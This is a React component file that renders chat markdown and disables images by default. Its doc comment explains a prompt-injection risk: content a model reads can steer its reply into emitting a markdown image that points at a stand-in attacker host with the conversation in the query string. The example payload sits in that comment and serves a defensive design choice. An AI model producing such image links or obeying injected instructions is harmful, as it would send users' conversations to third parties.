import React from 'react';
import { MarkdownText } from '@blue-orange-ai/foundations-core';

import './MarkdownMessage.css';

interface Props {
    text: string;
    /**
     * Shows images the markdown links to. Off by default: a model's reply can
     * be steered by whatever it read (a web page, a document, a tool result),
     * and an image is fetched the moment it is shown, so an injected
     * `![](https://attacker/?q=<conversation>)` would carry the conversation
     * out without anyone clicking. Turn it on only when the text is trusted.
     */
    allowImages?: boolean;
}

/**
 * Renders assistant/user markdown by reusing core's `MarkdownText` — the same
 * remark/rehype/katex + highlight.js pipeline the rest of the monorepo uses, so
 * code fences, GFM tables and math all render consistently and we don't
 * duplicate the toolchain. MarkdownText sanitizes what it renders, so links to
 * `javascript:` and similar never reach the page.
 */
export const MarkdownMessage: React.FC<Props> = ({ text, allowImages = false }) => (
    <div className="blue-orange-llm-markdown">
        <MarkdownText allowImages={allowImages}>{text}</MarkdownText>
    </div>
);
